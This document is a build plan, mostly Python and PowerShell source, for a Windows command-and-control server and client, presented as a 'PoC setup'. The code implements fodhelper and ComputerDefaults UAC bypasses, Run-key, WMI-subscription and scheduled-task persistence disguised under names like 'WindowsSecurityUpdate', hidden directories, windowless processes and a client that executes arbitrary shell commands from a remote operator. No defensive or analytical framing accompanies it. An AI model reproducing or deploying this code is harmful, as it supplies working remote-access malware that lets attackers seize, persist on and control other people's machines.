# Windows Setup Build Plan

## Overview
A PoC setup for Windows environment, focusing on compatibility and deployment.

## Layout
- server.py: Server script
- client.py: Client script
- config/: Configuration files

## Config
- Use Windows paths and environment variables
- Optionally use pyinstaller for executable builds

## Setup
1. Install Python 3.x on Windows
2. Set up config files in config/
3. Run server.py and client.py

## Build Instructions
- To build executables: `pyinstaller server.py` and `pyinstaller client.py`

## Infrastructure
- Windows machines (local or remote)

## Example
```powershell
# Modern PowerShell execution with enhanced security bypasses
# Set execution policy to allow script execution
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force

# Start C2 server with Windows-specific optimizations
python server.py --windows-mode --bind-port 8443

# Execute client with stealth configurations
python client.py --stealth --auto-persist
```

## Enhanced Windows Implementation with Modern Security

### Windows-Optimized Server (windows_server.py)
```python
#!/usr/bin/env python3
# Windows-Optimized C2 Server with WMI Integration
# Implements Windows-specific features and Active Directory integration

import os                       # Operating system interface
import sys                      # System-specific parameters
import socket                   # Network communications
import ssl                      # Secure sockets layer
import threading               # Multi-threading support
import logging                 # Comprehensive logging
import subprocess              # Process execution
import winreg                  # Windows registry access (Windows only)
import win32api                # Windows API access
import win32con                # Windows constants
import win32security           # Windows security APIs
import win32service            # Windows service management
import win32serviceutil        # Service utilities
import wmi                     # Windows Management Instrumentation
import psutil                  # Cross-platform system utilities
import ctypes                  # C data types for Windows API
from ctypes import wintypes    # Windows-specific data types
import json                    # JSON serialization
import base64                  # Base64 encoding/decoding
import hashlib                 # Cryptographic hashing
import secrets                 # Secure random generation
from pathlib import Path       # Modern path handling
from datetime import datetime, timedelta  # Date and time utilities
import tempfile                # Temporary file operations

# Windows-specific imports with error handling
try:
    import pythoncom           # Python COM interface
    import win32com.client     # COM client support
    from win32com.shell import shell, shellcon  # Windows shell interfaces
    WINDOWS_SPECIFIC = True
except ImportError:
    WINDOWS_SPECIFIC = False
    logging.warning("Windows-specific modules not available")

# Configure Windows-optimized logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(
            os.path.expandvars(r'%TEMP%\c2_server.log'),  # Windows temp directory
            encoding='utf-8'
        ),
        logging.StreamHandler()
    ]
)

class WindowsSecurityManager:
    """
    Windows-specific security management and privilege operations
    """
    
    def __init__(self):
        """Initialize Windows security manager"""
        self.current_user = None
        self.is_admin = False
        self.token_info = {}
        
        self._get_current_user_info()
        logging.info(f"Windows Security Manager initialized for user: {self.current_user}")
    
    def _get_current_user_info(self):
        """
        Retrieve current user and privilege information
        """
        try:
            # Get current user information
            self.current_user = win32api.GetUserName()  # Current username
            
            # Check if running with administrator privileges
            self.is_admin = ctypes.windll.shell32.IsUserAnAdmin()
            
            # Get security token information
            token = win32security.OpenProcessToken(
                win32api.GetCurrentProcess(),
                win32con.TOKEN_QUERY
            )
            
            # Get token user information
            token_user = win32security.GetTokenInformation(
                token, win32security.TokenUser
            )
            
            # Get user SID string
            user_sid = win32security.ConvertSidToStringSid(token_user[0])
            
            self.token_info = {
                'user_sid': user_sid,
                'is_admin': self.is_admin,
                'username': self.current_user
            }
            
            logging.info(f"User info: {self.current_user}, Admin: {self.is_admin}")
            
        except Exception as e:
            logging.error(f"Failed to get user info: {e}")
    
    def elevate_privileges(self) -> bool:
        """
        Attempt to elevate privileges using UAC bypass techniques
        
        Returns:
            bool: True if elevation successful, False otherwise
        """
        if self.is_admin:
            logging.info("Already running with administrator privileges")
            return True
        
        try:
            # Method 1: UAC bypass using fodhelper.exe (Windows 10)
            if self._uac_bypass_fodhelper():
                return True
            
            # Method 2: UAC bypass using ComputerDefaults.exe
            if self._uac_bypass_computerdefaults():
                return True
            
            # Method 3: Standard UAC prompt
            return self._request_elevation()
            
        except Exception as e:
            logging.error(f"Privilege elevation failed: {e}")
            return False
    
    def _uac_bypass_fodhelper(self) -> bool:
        """
        UAC bypass using fodhelper.exe registry manipulation
        
        Returns:
            bool: True if bypass successful
        """
        try:
            # Create registry key for fodhelper bypass
            key_path = r"Software\Classes\ms-settings\Shell\Open\command"
            
            # Create the registry key
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            
            # Set the default value to our executable
            current_script = sys.executable + " " + " ".join(sys.argv)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_script)
            
            # Set DelegateExecute to empty string
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            
            winreg.CloseKey(key)
            
            # Execute fodhelper.exe to trigger bypass
            subprocess.run([r"C:\Windows\System32\fodhelper.exe"], 
                         shell=True, capture_output=True)
            
            # Clean up registry modifications
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
            
            logging.info("UAC bypass attempt via fodhelper completed")
            return True
            
        except Exception as e:
            logging.error(f"fodhelper UAC bypass failed: {e}")
            return False
    
    def _uac_bypass_computerdefaults(self) -> bool:
        """
        UAC bypass using ComputerDefaults.exe
        
        Returns:
            bool: True if bypass successful
        """
        try:
            # Similar technique using ComputerDefaults.exe
            key_path = r"Software\Classes\exefile\shell\runas\command"
            
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            
            current_script = sys.executable + " " + " ".join(sys.argv)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_script)
            
            winreg.CloseKey(key)
            
            # Execute ComputerDefaults.exe
            subprocess.run([r"C:\Windows\System32\ComputerDefaults.exe"], 
                         shell=True, capture_output=True)
            
            # Cleanup
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
            
            logging.info("UAC bypass attempt via ComputerDefaults completed")
            return True
            
        except Exception as e:
            logging.error(f"ComputerDefaults UAC bypass failed: {e}")
            return False
    
    def _request_elevation(self) -> bool:
        """
        Request standard UAC elevation prompt
        
        Returns:
            bool: True if user accepted elevation
        """
        try:
            # Use ShellExecute with runas verb to trigger UAC
            result = shell.ShellExecuteEx(
                nShow=win32con.SW_SHOWNORMAL,
                fMask=shellcon.SEE_MASK_NOCLOSEPROCESS,
                lpVerb='runas',
                lpFile=sys.executable,
                lpParameters=' '.join(sys.argv)
            )
            
            if result['hProcess']:
                logging.info("UAC elevation prompt displayed")
                return True
            
        except Exception as e:
            logging.error(f"Standard elevation request failed: {e}")
            
        return False

class WindowsRegistryManager:
    """
    Windows Registry manipulation for persistence and configuration
    """
    
    def __init__(self):
        """Initialize registry manager"""
        self.persistence_keys = [
            # Common persistence locations
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
            (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
            (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
        ]
        
        logging.info("Registry manager initialized")
    
    def create_persistence(self, name: str, executable_path: str, 
                         hive: int = winreg.HKEY_CURRENT_USER) -> bool:
        """
        Create registry-based persistence mechanism
        
        Args:
            name: Registry entry name
            executable_path: Path to executable for persistence
            hive: Registry hive (HKCU or HKLM)
            
        Returns:
            bool: True if persistence created successfully
        """
        try:
            # Choose appropriate registry path based on privileges
            if hive == winreg.HKEY_LOCAL_MACHINE:
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            else:
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            
            # Open registry key with write access
            key = winreg.OpenKey(hive, key_path, 0, winreg.KEY_SET_VALUE)
            
            # Set registry value for persistence
            winreg.SetValueEx(key, name, 0, winreg.REG_SZ, executable_path)
            
            winreg.CloseKey(key)
            
            logging.info(f"Registry persistence created: {name} -> {executable_path}")
            return True
            
        except Exception as e:
            logging.error(f"Failed to create registry persistence: {e}")
            return False
    
    def remove_persistence(self, name: str, 
                         hive: int = winreg.HKEY_CURRENT_USER) -> bool:
        """
        Remove registry-based persistence
        
        Args:
            name: Registry entry name to remove
            hive: Registry hive to search
            
        Returns:
            bool: True if persistence removed successfully
        """
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            
            # Open registry key
            key = winreg.OpenKey(hive, key_path, 0, winreg.KEY_SET_VALUE)
            
            # Delete the registry value
            winreg.DeleteValue(key, name)
            
            winreg.CloseKey(key)
            
            logging.info(f"Registry persistence removed: {name}")
            return True
            
        except FileNotFoundError:
            logging.warning(f"Registry entry not found: {name}")
            return True  # Already removed
        except Exception as e:
            logging.error(f"Failed to remove registry persistence: {e}")
            return False
    
    def hide_in_registry(self, key_path: str, value_name: str, data: str) -> bool:
        """
        Hide data in less obvious registry locations
        
        Args:
            key_path: Registry key path
            value_name: Value name
            data: Data to store
            
        Returns:
            bool: True if data hidden successfully
        """
        try:
            # Create or open the registry key
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            
            # Store data as binary to make it less obvious
            encoded_data = base64.b64encode(data.encode()).decode()
            winreg.SetValueEx(key, value_name, 0, winreg.REG_BINARY, 
                            encoded_data.encode())
            
            winreg.CloseKey(key)
            
            logging.info(f"Data hidden in registry: {key_path}\\{value_name}")
            return True
            
        except Exception as e:
            logging.error(f"Failed to hide data in registry: {e}")
            return False

class WindowsWMIManager:
    """
    Windows Management Instrumentation (WMI) operations
    """
    
    def __init__(self):
        """Initialize WMI manager"""
        self.wmi_connection = None
        self._connect_wmi()
    
    def _connect_wmi(self):
        """Establish WMI connection"""
        try:
            # Initialize COM for WMI operations
            pythoncom.CoInitialize()
            
            # Connect to WMI
            self.wmi_connection = wmi.WMI()
            
            logging.info("WMI connection established")
            
        except Exception as e:
            logging.error(f"WMI connection failed: {e}")
    
    def create_wmi_persistence(self, name: str, script_path: str) -> bool:
        """
        Create WMI event subscription for persistence
        
        Args:
            name: Event consumer name
            script_path: Script to execute
            
        Returns:
            bool: True if WMI persistence created
        """
        try:
            if not self.wmi_connection:
                return False
            
            # Create WMI event filter (triggers on system startup)
            filter_query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'"
            
            # Create event filter
            event_filter = self.wmi_connection.WmiMoniker(
                f"//./root/subscription:__EventFilter.Name='{name}_Filter'"
            )
            
            # Create event consumer (executes our script)
            consumer = self.wmi_connection.WmiMoniker(
                f"//./root/subscription:CommandLineEventConsumer.Name='{name}_Consumer'"
            )
            
            # Set consumer properties
            consumer.CommandLineTemplate = script_path
            consumer.Name = f"{name}_Consumer"
            
            # Create filter properties
            event_filter.Name = f"{name}_Filter"
            event_filter.Query = filter_query
            event_filter.QueryLanguage = "WQL"
            
            # Bind filter to consumer
            binding = self.wmi_connection.WmiMoniker(
                f"//./root/subscription:__FilterToConsumerBinding"
            )
            
            binding.Filter = event_filter.path_()
            binding.Consumer = consumer.path_()
            
            # Save objects to WMI repository
            event_filter.put_()
            consumer.put_()
            binding.put_()
            
            logging.info(f"WMI persistence created: {name}")
            return True
            
        except Exception as e:
            logging.error(f"WMI persistence creation failed: {e}")
            return False
    
    def gather_system_info(self) -> dict:
        """
        Gather comprehensive system information via WMI
        
        Returns:
            Dictionary containing system information
        """
        system_info = {}
        
        try:
            if not self.wmi_connection:
                return system_info
            
            # Get computer system information
            for computer in self.wmi_connection.Win32_ComputerSystem():
                system_info.update({
                    'computer_name': computer.Name,
                    'domain': computer.Domain,
                    'manufacturer': computer.Manufacturer,
                    'model': computer.Model,
                    'total_memory': computer.TotalPhysicalMemory,
                    'username': computer.UserName
                })
            
            # Get operating system information
            for os_info in self.wmi_connection.Win32_OperatingSystem():
                system_info.update({
                    'os_name': os_info.Caption,
                    'os_version': os_info.Version,
                    'os_architecture': os_info.OSArchitecture,
                    'install_date': str(os_info.InstallDate),
                    'last_boot': str(os_info.LastBootUpTime)
                })
            
            # Get processor information
            for processor in self.wmi_connection.Win32_Processor():
                system_info.update({
                    'processor_name': processor.Name,
                    'processor_cores': processor.NumberOfCores,
                    'processor_threads': processor.NumberOfLogicalProcessors
                })
                break  # Only need first processor
            
            # Get network adapter information
            network_adapters = []
            for adapter in self.wmi_connection.Win32_NetworkAdapterConfiguration(IPEnabled=True):
                adapter_info = {
                    'description': adapter.Description,
                    'mac_address': adapter.MACAddress,
                    'ip_addresses': adapter.IPAddress,
                    'subnet_masks': adapter.IPSubnet,
                    'default_gateways': adapter.DefaultIPGateway
                }
                network_adapters.append(adapter_info)
            
            system_info['network_adapters'] = network_adapters
            
            # Get installed software
            installed_software = []
            for product in self.wmi_connection.Win32_Product():
                software_info = {
                    'name': product.Name,
                    'version': product.Version,
                    'vendor': product.Vendor,
                    'install_date': product.InstallDate
                }
                installed_software.append(software_info)
            
            system_info['installed_software'] = installed_software[:50]  # Limit to first 50
            
            logging.info("System information gathered via WMI")
            
        except Exception as e:
            logging.error(f"WMI system info gathering failed: {e}")
        
        return system_info

class WindowsC2Server:
    """
    Windows-optimized C2 server with enhanced Windows integration
    """
    
    def __init__(self, host='0.0.0.0', port=8443):
        """
        Initialize Windows C2 server
        
        Args:
            host: Server bind address
            port: Server listening port
        """
        self.host = host
        self.port = port
        self.active_sessions = {}
        
        # Initialize Windows-specific managers
        self.security_manager = WindowsSecurityManager()
        self.registry_manager = WindowsRegistryManager()
        self.wmi_manager = WindowsWMIManager()
        
        # Server configuration
        self.server_socket = None
        self.ssl_context = None
        
        self._setup_ssl_context()
        
        logging.info(f"Windows C2 Server initialized on {host}:{port}")
    
    def _setup_ssl_context(self):
        """Setup SSL context for secure communications"""
        try:
            # Create SSL context
            self.ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
            
            # Generate self-signed certificate if not exists
            cert_file = os.path.expandvars(r'%TEMP%\server.crt')
            key_file = os.path.expandvars(r'%TEMP%\server.key')
            
            if not os.path.exists(cert_file) or not os.path.exists(key_file):
                self._generate_self_signed_cert(cert_file, key_file)
            
            # Load certificate and key
            self.ssl_context.load_cert_chain(cert_file, key_file)
            
            logging.info("SSL context configured")
            
        except Exception as e:
            logging.error(f"SSL setup failed: {e}")
    
    def _generate_self_signed_cert(self, cert_file: str, key_file: str):
        """Generate self-signed certificate for testing"""
        try:
            # Use PowerShell to generate certificate (Windows 10+)
            powershell_cmd = f'''
            $cert = New-SelfSignedCertificate -DnsName "localhost" -CertStoreLocation "cert:\\LocalMachine\\My"
            $pwd = ConvertTo-SecureString -String "password" -Force -AsPlainText
            $path = "cert:\\LocalMachine\\My\\$($cert.Thumbprint)"
            Export-PfxCertificate -Cert $path -FilePath "{cert_file}" -Password $pwd
            '''
            
            subprocess.run(['powershell', '-Command', powershell_cmd], 
                         capture_output=True, text=True)
            
            logging.info("Self-signed certificate generated")
            
        except Exception as e:
            logging.error(f"Certificate generation failed: {e}")
    
    def start_server(self):
        """Start the Windows C2 server"""
        try:
            # Create server socket
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            # Bind to address and port
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(10)
            
            # Wrap with SSL
            if self.ssl_context:
                self.server_socket = self.ssl_context.wrap_socket(
                    self.server_socket, server_side=True
                )
            
            logging.info(f"Windows C2 Server listening on {self.host}:{self.port}")
            
            # Main server loop
            while True:
                try:
                    client_socket, client_address = self.server_socket.accept()
                    
                    # Handle client in separate thread
                    client_thread = threading.Thread(
                        target=self._handle_client,
                        args=(client_socket, client_address)
                    )
                    client_thread.daemon = True
                    client_thread.start()
                    
                except KeyboardInterrupt:
                    logging.info("Server shutdown requested")
                    break
                except Exception as e:
                    logging.error(f"Client accept error: {e}")
                    
        except Exception as e:
            logging.error(f"Server startup failed: {e}")
        finally:
            if self.server_socket:
                self.server_socket.close()
    
    def _handle_client(self, client_socket, client_address):
        """Handle individual client connections"""
        session_id = secrets.token_hex(16)
        
        try:
            logging.info(f"New Windows client: {client_address}, Session: {session_id}")
            
            # Store session
            self.active_sessions[session_id] = {
                'address': client_address,
                'socket': client_socket,
                'platform': 'windows',
                'start_time': datetime.now()
            }
            
            # Send welcome message with Windows info
            welcome_msg = {
                'status': 'connected',
                'session_id': session_id,
                'server_info': {
                    'platform': 'windows',
                    'user': self.security_manager.current_user,
                    'admin': self.security_manager.is_admin
                }
            }
            
            self._send_json(client_socket, welcome_msg)
            
            # Main command loop
            while True:
                try:
                    data = client_socket.recv(4096)
                    if not data:
                        break
                    
                    # Process command
                    command = json.loads(data.decode())
                    response = self._process_windows_command(command)
                    
                    # Send response
                    self._send_json(client_socket, response)
                    
                except Exception as e:
                    logging.error(f"Command processing error: {e}")
                    break
                    
        except Exception as e:
            logging.error(f"Client handling error: {e}")
        finally:
            if session_id in self.active_sessions:
                del self.active_sessions[session_id]
            client_socket.close()
            logging.info(f"Session {session_id} closed")
    
    def _send_json(self, socket, data):
        """Send JSON data over socket"""
        try:
            json_data = json.dumps(data).encode()
            socket.send(json_data)
        except Exception as e:
            logging.error(f"JSON send error: {e}")
    
    def _process_windows_command(self, command):
        """Process Windows-specific commands"""
        cmd_type = command.get('type', '')
        
        try:
            if cmd_type == 'sysinfo':
                return {
                    'status': 'success',
                    'data': self.wmi_manager.gather_system_info()
                }
            
            elif cmd_type == 'elevate':
                success = self.security_manager.elevate_privileges()
                return {
                    'status': 'success' if success else 'failed',
                    'data': {'elevated': success}
                }
            
            elif cmd_type == 'persist':
                name = command.get('name', 'WindowsUpdate')
                path = command.get('path', sys.executable)
                success = self.registry_manager.create_persistence(name, path)
                return {
                    'status': 'success' if success else 'failed',
                    'data': {'persistence_created': success}
                }
            
            elif cmd_type == 'wmi_persist':
                name = command.get('name', 'SystemMonitor')
                script = command.get('script', sys.executable)
                success = self.wmi_manager.create_wmi_persistence(name, script)
                return {
                    'status': 'success' if success else 'failed',
                    'data': {'wmi_persistence_created': success}
                }
            
            elif cmd_type == 'exec':
                cmd = command.get('command', '')
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                return {
                    'status': 'success',
                    'data': {
                        'stdout': result.stdout,
                        'stderr': result.stderr,
                        'returncode': result.returncode
                    }
                }
            
            else:
                return {
                    'status': 'error',
                    'message': f'Unknown command type: {cmd_type}'
                }
                
        except Exception as e:
            return {
                'status': 'error',
                'message': str(e)
            }

# Main execution
if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == '--windows-mode':
        # Start Windows-optimized server
        server = WindowsC2Server()
        server.start_server()
    else:
        print("Usage: python windows_server.py --windows-mode")
```

### PowerShell Deployment Script (deploy.ps1)
```powershell
<#
.SYNOPSIS
    Windows C2 Deployment Script with Advanced Features
.DESCRIPTION
    Deploys C2 infrastructure on Windows with stealth and persistence
.PARAMETER Mode
    Deployment mode: server, client, or full
.PARAMETER Stealth
    Enable stealth mode with evasion techniques
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory=$true)]
    [ValidateSet("server", "client", "full")]
    [string]$Mode,
    
    [switch]$Stealth,
    [switch]$Persist,
    [string]$ServerHost = "127.0.0.1",
    [int]$ServerPort = 8443
)

# Set execution policy for current session
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force

# Import required modules
Import-Module Microsoft.PowerShell.Management
Import-Module Microsoft.PowerShell.Security
Import-Module Microsoft.PowerShell.Utility

# Global variables
$script:LogPath = "$env:TEMP\c2_deploy.log"
$script:InstallPath = "$env:LOCALAPPDATA\WindowsUpdate"

function Write-Log {
    <#
    .SYNOPSIS
        Write log message with timestamp
    #>
    param([string]$Message, [string]$Level = "INFO")
    
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logMessage = "[$timestamp] [$Level] $Message"
    
    Write-Host $logMessage
    Add-Content -Path $script:LogPath -Value $logMessage -Force
}

function Test-AdminPrivileges {
    <#
    .SYNOPSIS
        Check if running with administrator privileges
    #>
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Invoke-UACSelf {
    <#
    .SYNOPSIS
        Re-launch script with elevated privileges
    #>
    if (-not (Test-AdminPrivileges)) {
        Write-Log "Attempting to elevate privileges..."
        
        $arguments = "-ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`""
        foreach ($param in $PSBoundParameters.GetEnumerator()) {
            $arguments += " -$($param.Key) $($param.Value)"
        }
        
        try {
            Start-Process PowerShell -Verb RunAs -ArgumentList $arguments
            exit 0
        }
        catch {
            Write-Log "Failed to elevate privileges: $($_.Exception.Message)" "ERROR"
            return $false
        }
    }
    return $true
}

function Install-Dependencies {
    <#
    .SYNOPSIS
        Install required Python packages and dependencies
    #>
    Write-Log "Installing dependencies..."
    
    # Check if Python is installed
    try {
        $pythonVersion = python --version 2>&1
        Write-Log "Python found: $pythonVersion"
    }
    catch {
        Write-Log "Python not found, attempting to install..." "WARNING"
        
        # Download and install Python silently
        $pythonUrl = "https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe"
        $pythonInstaller = "$env:TEMP\python-installer.exe"
        
        Invoke-WebRequest -Uri $pythonUrl -OutFile $pythonInstaller
        Start-Process -FilePath $pythonInstaller -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1" -Wait
        
        # Refresh environment variables
        $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
    }
    
    # Install required Python packages
    $packages = @(
        "cryptography",
        "pywin32",
        "wmi",
        "psutil",
        "requests",
        "fastapi",
        "uvicorn"
    )
    
    foreach ($package in $packages) {
        Write-Log "Installing Python package: $package"
        python -m pip install $package --quiet --no-warn-script-location
    }
}

function New-StealthDirectory {
    <#
    .SYNOPSIS
        Create hidden directory for C2 installation
    #>
    param([string]$Path)
    
    Write-Log "Creating stealth directory: $Path"
    
    # Create directory
    New-Item -ItemType Directory -Path $Path -Force | Out-Null
    
    # Set hidden attribute
    (Get-Item $Path).Attributes += [System.IO.FileAttributes]::Hidden
    
    # Set system attribute for additional stealth
    if ($Stealth) {
        (Get-Item $Path).Attributes += [System.IO.FileAttributes]::System
    }
    
    return $Path
}

function Set-RegistryPersistence {
    <#
    .SYNOPSIS
        Create registry-based persistence
    #>
    param(
        [string]$Name,
        [string]$Command
    )
    
    Write-Log "Creating registry persistence: $Name"
    
    try {
        # Choose registry hive based on privileges
        if (Test-AdminPrivileges) {
            $regPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
        } else {
            $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        }
        
        # Create registry entry
        Set-ItemProperty -Path $regPath -Name $Name -Value $Command -Force
        
        Write-Log "Registry persistence created successfully"
        return $true
    }
    catch {
        Write-Log "Failed to create registry persistence: $($_.Exception.Message)" "ERROR"
        return $false
    }
}

function Set-ScheduledTaskPersistence {
    <#
    .SYNOPSIS
        Create scheduled task for persistence
    #>
    param(
        [string]$TaskName,
        [string]$Command
    )
    
    Write-Log "Creating scheduled task persistence: $TaskName"
    
    try {
        # Create scheduled task action
        $action = New-ScheduledTaskAction -Execute "python.exe" -Argument $Command
        
        # Create trigger (daily at startup + logon)
        $triggers = @(
            New-ScheduledTaskTrigger -AtStartup,
            New-ScheduledTaskTrigger -AtLogon
        )
        
        # Create principal (highest privileges available)
        if (Test-AdminPrivileges) {
            $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        } else {
            $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive
        }
        
        # Create settings
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
        
        # Register the task
        Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $triggers -Principal $principal -Settings $settings -Force
        
        Write-Log "Scheduled task persistence created successfully"
        return $true
    }
    catch {
        Write-Log "Failed to create scheduled task persistence: $($_.Exception.Message)" "ERROR"
        return $false
    }
}

function Start-StealthProcesses {
    <#
    .SYNOPSIS
        Start processes with stealth techniques
    #>
    param([string]$Command, [string]$Arguments)
    
    Write-Log "Starting stealth process: $Command $Arguments"
    
    try {
        # Create process with hidden window
        $processInfo = New-Object System.Diagnostics.ProcessStartInfo
        $processInfo.FileName = $Command
        $processInfo.Arguments = $Arguments
        $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $processInfo.CreateNoWindow = $true
        $processInfo.UseShellExecute = $false
        
        # Start the process
        $process = [System.Diagnostics.Process]::Start($processInfo)
        
        Write-Log "Stealth process started with PID: $($process.Id)"
        return $process
    }
    catch {
        Write-Log "Failed to start stealth process: $($_.Exception.Message)" "ERROR"
        return $null
    }
}

function Deploy-Server {
    <#
    .SYNOPSIS
        Deploy C2 server component
    #>
    Write-Log "Deploying C2 server..."
    
    # Create installation directory
    $serverPath = New-StealthDirectory -Path $script:InstallPath
    
    # Copy server files
    Copy-Item -Path ".\windows_server.py" -Destination "$serverPath\server.py" -Force
    Copy-Item -Path ".\config" -Destination "$serverPath\config" -Recurse -Force -ErrorAction SilentlyContinue
    
    # Create startup script
    $startupScript = @"
import sys
import os
sys.path.insert(0, os.path.dirname(__file__))
from server import WindowsC2Server

if __name__ == "__main__":
    server = WindowsC2Server('0.0.0.0', $ServerPort)
    server.start_server()
"@
    
    Set-Content -Path "$serverPath\start_server.py" -Value $startupScript -Force
    
    # Set persistence if requested
    if ($Persist) {
        $serverCommand = "python.exe `"$serverPath\start_server.py`""
        Set-RegistryPersistence -Name "WindowsSecurityUpdate" -Command $serverCommand
        Set-ScheduledTaskPersistence -TaskName "WindowsSecurityUpdate" -Command "`"$serverPath\start_server.py`""
    }
    
    # Start server
    if ($Stealth) {
        Start-StealthProcesses -Command "python.exe" -Arguments "`"$serverPath\start_server.py`""
    } else {
        python "$serverPath\start_server.py"
    }
}

function Deploy-Client {
    <#
    .SYNOPSIS
        Deploy C2 client component
    #>
    Write-Log "Deploying C2 client..."
    
    # Create installation directory
    $clientPath = New-StealthDirectory -Path "$script:InstallPath\client"
    
    # Create client script
    $clientScript = @"
import socket
import ssl
import json
import subprocess
import time
import sys
import os

class WindowsC2Client:
    def __init__(self, server_host='$ServerHost', server_port=$ServerPort):
        self.server_host = server_host
        self.server_port = server_port
        self.reconnect_delay = 30
    
    def connect_to_server(self):
        try:
            # Create SSL context
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            # Create socket and connect
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ssl_sock = context.wrap_socket(sock)
            ssl_sock.connect((self.server_host, self.server_port))
            
            return ssl_sock
        except Exception as e:
            print(f"Connection failed: {e}")
            return None
    
    def main_loop(self):
        while True:
            try:
                sock = self.connect_to_server()
                if not sock:
                    time.sleep(self.reconnect_delay)
                    continue
                
                while True:
                    try:
                        data = sock.recv(4096)
                        if not data:
                            break
                        
                        command = json.loads(data.decode())
                        response = self.process_command(command)
                        
                        sock.send(json.dumps(response).encode())
                    except Exception as e:
                        print(f"Command error: {e}")
                        break
            except Exception as e:
                print(f"Main loop error: {e}")
                time.sleep(self.reconnect_delay)
    
    def process_command(self, command):
        cmd_type = command.get('type', '')
        
        if cmd_type == 'exec':
            cmd = command.get('command', '')
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            return {
                'status': 'success',
                'data': {
                    'stdout': result.stdout,
                    'stderr': result.stderr,
                    'returncode': result.returncode
                }
            }
        else:
            return {'status': 'error', 'message': 'Unknown command'}

if __name__ == "__main__":
    client = WindowsC2Client()
    client.main_loop()
"@
    
    Set-Content -Path "$clientPath\client.py" -Value $clientScript -Force
    
    # Set persistence if requested
    if ($Persist) {
        $clientCommand = "python.exe `"$clientPath\client.py`""
        Set-RegistryPersistence -Name "WindowsUpdateClient" -Command $clientCommand
        Set-ScheduledTaskPersistence -TaskName "WindowsUpdateClient" -Command "`"$clientPath\client.py`""
    }
    
    # Start client
    if ($Stealth) {
        Start-StealthProcesses -Command "python.exe" -Arguments "`"$clientPath\client.py`""
    } else {
        python "$clientPath\client.py"
    }
}

# Main deployment logic
function Main {
    Write-Log "Starting Windows C2 deployment (Mode: $Mode)"
    
    # Check and elevate privileges if needed
    if (-not (Invoke-UACSelf)) {
        Write-Log "Failed to obtain required privileges" "ERROR"
        return
    }
    
    # Install dependencies
    Install-Dependencies
    
    # Deploy based on mode
    switch ($Mode) {
        "server" {
            Deploy-Server
        }
        "client" {
            Deploy-Client
        }
        "full" {
            Deploy-Server
            Start-Sleep -Seconds 5
            Deploy-Client
        }
    }
    
    Write-Log "Deployment completed successfully"
}

# Execute main function
Main
```
